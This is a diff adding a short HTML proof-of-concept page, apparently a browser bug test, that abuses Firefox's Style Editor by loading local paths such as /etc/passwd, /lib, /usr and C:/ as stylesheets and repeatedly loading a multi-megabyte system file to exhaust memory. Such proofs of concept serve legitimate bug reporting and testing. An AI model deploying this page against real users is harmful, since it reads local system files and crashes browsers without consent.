@@ -1,0 +1,42 @@
+<!--
+    Use Firefox's Style Editor to read local files and consume memory.
+-->
+<html>
+    <head>
+    <script>
+        // Load multiple copies of a file.
+        const NUM_COPIES = 30;
+
+        // Load a stylesheet from the filesystem
+        const addStyleSheet = (path) => {
+            e = document.createElement('link');
+            e.rel = 'stylesheet';
+            e.href = 'file://' + path;
+            document.head.appendChild(e);
+        };
+
+        if (navigator.userAgent.indexOf('Windows') === -1) {
+            // Read a Linux file and directory.
+            // This should work on Mac, too.
+            addStyleSheet('/lib');
+            addStyleSheet('/etc/passwd');
+            addStyleSheet('/usr');
+
+            // Select a several-megabyte file.
+            // This is Linux-specific.
+            var path = '/lib/udev/hwdb.bin?css';
+        } else {
+            // Read the contents of C:.
+            addStyleSheet('C:/');
+
+            // Select a several-megabyte file on Windows.
+            var path = '/C:/Windows/system32/mshtml.dll';
+        }
+                    
+        // Repeatedly load a file on Linux or Windows
+        for (i = 0; i < NUM_COPIES; i++) {
+            addStyleSheet(path);
+        }
+    </script>
+    </head>
+</html>
